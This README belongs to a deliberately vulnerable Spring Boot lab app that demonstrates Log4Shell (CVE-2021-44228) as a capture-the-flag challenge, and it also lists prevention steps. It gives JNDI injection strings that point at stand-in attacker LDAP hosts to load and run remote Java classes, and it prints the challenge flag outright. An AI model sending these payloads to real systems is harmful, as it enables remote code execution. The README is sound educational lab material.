# Log4j Vulnerable Application

This is a deliberately vulnerable Spring Boot application that demonstrates the Log4Shell vulnerability (CVE-2021-44228).

## ⚠️ WARNING

This application contains intentionally vulnerable code for educational purposes only. **DO NOT deploy in production environments!**

## What is Log4Shell?

Log4Shell is a critical vulnerability in Apache Log4j that allows remote code execution through JNDI lookups. The vulnerability affects Log4j versions 2.0-beta9 through 2.14.1.

## Application Details

- **Framework**: Spring Boot 2.5.0
- **Vulnerable Component**: Log4j 2.14.1
- **CVE**: CVE-2021-44228
- **Port**: 8080 (mapped to 8081 on host)

## Vulnerable Endpoint

The application has a vulnerable search endpoint that logs user input without sanitization:

```
GET /search?q=<payload>
```

## How to Exploit

1. **Start the container**:
   ```bash
   docker-compose up -d --build
   ```

2. **Access the application**:
   ```
   http://localhost:8081
   ```

3. **Test the vulnerable endpoint**:
   ```bash
   curl "http://localhost:8081/search?q=\${jndi:ldap://malicious-server.com/exploit}"
   ```

4. **Exploit with a real payload**:
   - Set up an LDAP server that serves malicious Java classes
   - Use a payload like: `${jndi:ldap://your-ldap-server:1389/Exploit}`
   - The application will attempt to load and execute the malicious class

## Flag Challenge

The application contains a flag file at `/app/flag.txt` inside the container. To complete the challenge:

1. Exploit the Log4Shell vulnerability to gain remote code execution
2. Read the flag file: `cat /app/flag.txt`
3. Submit the flag: `FLAG{Log4Shell_Exploit_2024_7X9Y2Z}`

## Docker Commands

```bash
# Start the vulnerable application
docker-compose up -d --build

# Check if it's running
docker ps --filter "name=log4j-vulnerable-app"

# View logs
docker logs log4j-vulnerable-app

# Access the container
docker exec -it log4j-vulnerable-app sh

# Stop the application
docker-compose down
```

## Educational Resources

- [OWASP Log4Shell Guide](https://owasp.org/www-community/vulnerabilities/Log4Shell)
- [CVE-2021-44228 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [Apache Log4j Security Advisories](https://logging.apache.org/log4j/2.x/security.html)

## Prevention

To prevent Log4Shell:

1. **Update Log4j** to version 2.15.0 or later
2. **Disable JNDI lookups** by setting `log4j2.formatMsgNoLookups=true`
3. **Remove JndiLookup class** from the classpath
4. **Use security managers** to restrict JNDI access
5. **Validate and sanitize** all user input before logging

## Disclaimer

This application is created solely for educational purposes to help security professionals understand and test the Log4Shell vulnerability in a controlled environment. The authors are not responsible for any misuse of this application. 